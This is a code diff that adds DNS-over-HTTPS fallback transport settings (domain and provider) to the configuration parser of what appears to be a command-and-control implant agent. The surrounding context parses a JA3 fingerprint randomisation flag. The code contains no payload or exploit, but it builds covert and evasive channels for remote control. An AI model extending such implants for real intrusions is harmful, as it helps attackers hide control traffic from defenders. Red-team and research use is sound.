@@ -837,6 +837,28 @@ VOID DemonConfig()
      * Default to 0 (false) when the teamserver omits the field. */
     Instance->Config.Transport.Ja3Randomize = (BOOL) ParserGetInt32( &Parser );
     PRINTF( "[CONFIG] Ja3Randomize: %s\n", Instance->Config.Transport.Ja3Randomize ? "TRUE" : "FALSE" );
+
+    /* ARC-08: DNS-over-HTTPS fallback transport.
+     * The teamserver always packs these two fields for HTTP listeners so that
+     * the binary layout is stable regardless of whether the agent was compiled
+     * with TRANSPORT_DOH.  We only parse and store them here when the agent was
+     * actually compiled with DoH support. */
+#ifdef TRANSPORT_DOH
+    Buffer = ParserGetBytes( &Parser, &Length );
+    if ( Length > 0 )
+    {
+        Instance->Config.Transport.DoHDomain = MmHeapAlloc( Length + 1 );
+        MemCopy( Instance->Config.Transport.DoHDomain, Buffer, Length );
+        Instance->Config.Transport.DoHDomain[ Length ] = '\0';
+    }
+    else
+    {
+        Instance->Config.Transport.DoHDomain = NULL;
+    }
+    Instance->Config.Transport.DoHProvider = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] DoHDomain  : %s\n", Instance->Config.Transport.DoHDomain ? Instance->Config.Transport.DoHDomain : "(none)" );
+    PRINTF( "[CONFIG] DoHProvider: %d\n", Instance->Config.Transport.DoHProvider );
+#endif
 #endif
 
 #ifdef TRANSPORT_SMB
